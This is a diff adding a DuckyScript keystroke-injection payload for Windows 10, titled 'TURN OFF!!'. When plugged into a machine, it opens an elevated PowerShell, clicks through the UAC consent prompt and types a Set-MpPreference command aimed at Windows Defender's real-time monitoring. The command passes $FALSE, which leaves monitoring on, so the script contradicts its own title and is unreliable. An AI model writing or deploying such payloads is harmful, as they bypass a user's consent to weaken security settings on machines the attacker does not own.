@@ -1,0 +1,19 @@
+REM Author: JHOJY
+REM Title: TURN OFF!! 
+REM Target: windows 10 
+
+GUI r
+DELAY 500
+STRING powershell
+CTRL+SHIFT+ENTER
+DELAY 2000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $FALSE
+ENTER
+DELAY 300
+STRING exit
+ENTER
+
